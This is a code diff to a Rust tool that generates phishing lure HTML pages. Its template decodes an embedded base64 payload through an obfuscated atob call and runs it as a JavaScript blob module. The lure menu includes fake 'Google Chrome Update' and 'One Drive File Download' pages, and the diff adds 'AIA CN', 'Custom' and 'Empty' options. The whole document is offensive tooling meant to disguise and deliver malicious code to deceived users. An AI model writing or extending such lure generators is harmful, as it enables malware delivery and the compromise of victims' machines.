@@ -78,14 +78,16 @@ fn generate_lure(lure_type: &str, payload_format: &str, file_path: &str, payload
     let html_content = format!(r#"
     <html>
     <head>
-    <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+		
 
     </head>
-    <body>
+    <body class="">
+	
+	<div id="body_html">
+	
+	
+	</div>
+	
     <script type="module">
         const renboad = "{}"
         const blob = new Blob([window['at' + 'ob'](renboad)], {{ type: 'application/javascript' }});
@@ -172,7 +174,9 @@ fn main() {
     let lure_types = vec![
         "Google Chrome Update".truecolor(200, 155, 0),
         "One Drive File Download".truecolor(200, 155, 0),
-        "Sample".truecolor(200, 155, 0)
+		"AIA CN".truecolor(200, 155, 0),
+        "Custom".truecolor(200, 155, 0),
+		"Empty".truecolor(200, 155, 0)
         //
         // it is possible to add more lures in lure_templates folder and this menu
         // once  you do add a file, just add an entry to this menu
